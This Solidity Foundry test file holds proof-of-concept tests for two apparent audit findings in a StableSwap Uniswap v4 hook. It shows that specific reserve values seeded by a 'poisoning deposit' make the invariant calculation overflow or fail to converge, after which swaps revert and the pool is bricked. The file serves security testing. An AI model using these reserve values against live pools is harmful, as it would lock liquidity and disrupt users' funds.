// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {Test} from "forge-std/Test.sol";
import {stdError} from "forge-std/StdError.sol";

import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IV4Router} from "@uniswap/v4-periphery/src/interfaces/IV4Router.sol";
import {Actions} from "@uniswap/v4-periphery/src/libraries/Actions.sol";
import {CustomRevert} from "@uniswap/v4-core/src/libraries/CustomRevert.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";

import {Base} from "src/Base.sol";
import {StableSwapHooks} from "src/StableSwapHooks.sol";
import {StableSwapMath} from "src/libraries/StableSwapMath.sol";
import {StableSwapHooksFactoryHarness} from "test/testUtils/StableSwapHooksFactoryHarness.sol";
import {ExternalContractsDeployer} from "test/testUtils/ExternalContractsDeployer.sol";
import {Commands} from "test/testUtils/external/libraries/Commands.sol";
import {MockERC20} from "test/scenarios/mocks/MockERC20.sol";

contract InvariantBrickHarness {
    function getInvariant(uint256[] calldata _scaledReserves, uint256 _amplification) external pure returns (uint256) {
        uint256[] memory mem = new uint256[](_scaledReserves.length);

        for (uint256 i = 0; i < _scaledReserves.length; ++i) {
            mem[i] = _scaledReserves[i];
        }

        return StableSwapMath.getInvariant(mem, _amplification);
    }
}

contract InvariantBrickPoCTest is ExternalContractsDeployer {
    using SafeERC20 for IERC20;

    uint256 private constant AMP_PRECISION = 100;
    uint256 private constant LP_FEE_PERCENTAGE = 500;

    uint256 private constant OVERFLOW_SMALL_RESERVE = 1;
    uint256 private constant OVERFLOW_LARGE_RESERVE = 1e30;

    uint256 private constant NONCONVERGENT_AMP = 1;
    uint256 private constant NONCONVERGENT_RESERVE_A = 611943878777;
    uint256 private constant NONCONVERGENT_RESERVE_B = 93989313;

    InvariantBrickHarness private harness;
    StableSwapHooksFactoryHarness private factory;

    address private lp;
    address private attacker;

    function setUp() public override {
        super.setUp();

        harness = new InvariantBrickHarness();

        lp = makeAddr("lp");
        attacker = makeAddr("attacker");

        factory = new StableSwapHooksFactoryHarness(
            IPoolManager(poolManager),
            makeAddr("owner"),
            makeAddr("protocolFeeCollector"),
            makeAddr("hookFeeCollector"),
            keccak256(type(StableSwapHooks).creationCode)
        );
    }

    function test_finding63_getInvariantOverflowsOnImbalancedTwoTokenReserves() public {
        uint256[] memory scaledReserves = new uint256[](2);
        scaledReserves[0] = OVERFLOW_SMALL_RESERVE;
        scaledReserves[1] = OVERFLOW_LARGE_RESERVE;

        vm.expectRevert(stdError.arithmeticError);
        harness.getInvariant(scaledReserves, 100 * AMP_PRECISION);
    }

    function test_finding788_getInvariantNonConvergentLowAmpTwoTokenReserves() public {
        uint256[] memory scaledReserves = new uint256[](2);
        scaledReserves[0] = NONCONVERGENT_RESERVE_A;
        scaledReserves[1] = NONCONVERGENT_RESERVE_B;

        vm.expectRevert(StableSwapMath.ConvergenceNotReached.selector);
        harness.getInvariant(scaledReserves, NONCONVERGENT_AMP * AMP_PRECISION);
    }

    function test_finding63_overflowDepositSucceedsThenSwapBricksPool() public {
        StableSwapHooks hooks = _deployAndSeedPool(100, OVERFLOW_SMALL_RESERVE, OVERFLOW_LARGE_RESERVE);

        assertGt(hooks.balanceOf(lp), 0, "poisoning deposit succeeded");

        PoolKey memory poolKey = _poolKeyFor(hooks);
        bytes memory expectedRevert = _wrappedSwapRevert(hooks, stdError.arithmeticError);

        vm.expectRevert(expectedRevert);
        _executeExactInputSwap(poolKey, 1);
    }

    function test_finding788_nonConvergentDepositSucceedsThenSwapBricksPool() public {
        StableSwapHooks hooks = _deployAndSeedPool(NONCONVERGENT_AMP, NONCONVERGENT_RESERVE_A, NONCONVERGENT_RESERVE_B);

        assertGt(hooks.balanceOf(lp), 0, "poisoning deposit succeeded");

        PoolKey memory poolKey = _poolKeyFor(hooks);
        bytes memory inner = abi.encodeWithSelector(StableSwapMath.ConvergenceNotReached.selector);
        bytes memory expectedRevert = _wrappedSwapRevert(hooks, inner);

        vm.expectRevert(expectedRevert);
        _executeExactInputSwap(poolKey, 1);
    }

    function _deployAndSeedPool(uint256 _baseAmp, uint256 _reserve0, uint256 _reserve1)
        private
        returns (StableSwapHooks hooks)
    {
        Currency[] memory currencies = _deployTokens();

        Base.RateOracleConfig[] memory rateOracles = new Base.RateOracleConfig[](2);
        rateOracles[0] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});
        rateOracles[1] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});

        bytes memory code = type(StableSwapHooks).creationCode;
        (, bytes32 salt) = factory.mineSalt(currencies, rateOracles, LP_FEE_PERCENTAGE, _baseAmp, code);
        hooks = StableSwapHooks(factory.deploy(currencies, rateOracles, LP_FEE_PERCENTAGE, _baseAmp, salt, code));

        _seed(hooks, currencies, _reserve0, _reserve1);
    }

    function _deployTokens() private returns (Currency[] memory currencies) {
        MockERC20 tokenA = new MockERC20("Token A", "TKA", 18);
        MockERC20 tokenB = new MockERC20("Token B", "TKB", 18);

        (MockERC20 token0, MockERC20 token1) = address(tokenA) < address(tokenB) ? (tokenA, tokenB) : (tokenB, tokenA);

        currencies = new Currency[](2);
        currencies[0] = Currency.wrap(address(token0));
        currencies[1] = Currency.wrap(address(token1));
    }

    function _seed(StableSwapHooks _hooks, Currency[] memory _currencies, uint256 _reserve0, uint256 _reserve1)
        private
    {
        address token0 = Currency.unwrap(_currencies[0]);
        address token1 = Currency.unwrap(_currencies[1]);

        MockERC20(token0).mint(lp, _reserve0);
        MockERC20(token1).mint(lp, _reserve1);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = _reserve0;
        amounts[1] = _reserve1;

        vm.startPrank(lp);
        IERC20(token0).forceApprove(address(_hooks), type(uint256).max);
        IERC20(token1).forceApprove(address(_hooks), type(uint256).max);
        _hooks.addLiquidity(amounts, new uint256[](2), 0);
        vm.stopPrank();

        MockERC20(token0).mint(attacker, 1e24);

        vm.startPrank(attacker);
        IERC20(token0).forceApprove(address(permit2), type(uint256).max);
        permit2.approve(token0, address(universalRouter), type(uint160).max, type(uint48).max);
        vm.stopPrank();
    }

    function _poolKeyFor(StableSwapHooks _hooks) private view returns (PoolKey memory) {
        return PoolKey({
            currency0: _hooks.currencies(0),
            currency1: _hooks.currencies(1),
            fee: uint24(LP_FEE_PERCENTAGE),
            tickSpacing: _hooks.TICK_SPACING(),
            hooks: IHooks(address(_hooks))
        });
    }

    function _executeExactInputSwap(PoolKey memory poolKey, uint256 _amountIn) private {
        Currency currency0 = poolKey.currency0;
        Currency currency1 = poolKey.currency1;

        bytes memory actions =
            abi.encodePacked(uint8(Actions.SWAP_EXACT_IN_SINGLE), uint8(Actions.SETTLE_ALL), uint8(Actions.TAKE_ALL));

        bytes[] memory params = new bytes[](3);
        params[0] = abi.encode(
            IV4Router.ExactInputSingleParams({
                poolKey: poolKey,
                zeroForOne: true,
                amountIn: uint128(_amountIn),
                amountOutMinimum: 0,
                hookData: bytes("")
            })
        );
        params[1] = abi.encode(currency0, _amountIn);
        params[2] = abi.encode(currency1, 0);

        bytes memory commands = abi.encodePacked(uint8(Commands.V4_SWAP));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(actions, params);

        vm.prank(attacker);
        universalRouter.execute(commands, inputs, block.timestamp + 100);
    }

    function _wrappedSwapRevert(StableSwapHooks _hooks, bytes memory _innerError) private pure returns (bytes memory) {
        return abi.encodeWithSelector(
            CustomRevert.WrappedError.selector,
            address(_hooks),
            IHooks.beforeSwap.selector,
            _innerError,
            abi.encodeWithSelector(Hooks.HookCallFailed.selector)
        );
    }
}
